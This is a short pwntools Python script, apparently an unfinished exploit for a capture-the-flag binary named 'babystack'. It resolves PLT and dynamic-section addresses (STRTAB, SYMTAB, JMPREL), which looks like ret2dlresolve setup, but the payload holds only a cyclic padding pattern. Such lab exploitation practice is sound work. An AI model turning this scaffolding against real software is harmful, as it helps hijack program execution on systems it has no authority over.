from pwn import *
elf = ELF("./babystack", checksec=False)
bss = 0x0804a020 + 0x100
PLT = elf.get_section_by_name(".plt")["sh_addr"]
STRTAB, SYMTAB, JMPREL = map(elf.dynamic_value_by_tag,
    ["DT_STRTAB", "DT_SYMTAB", "DT_JMPREL"])

payload = b''.join([
    cyclic(0x14),
    
    
])
p = elf.process()
pause()
p.send(payload)
p.interactive()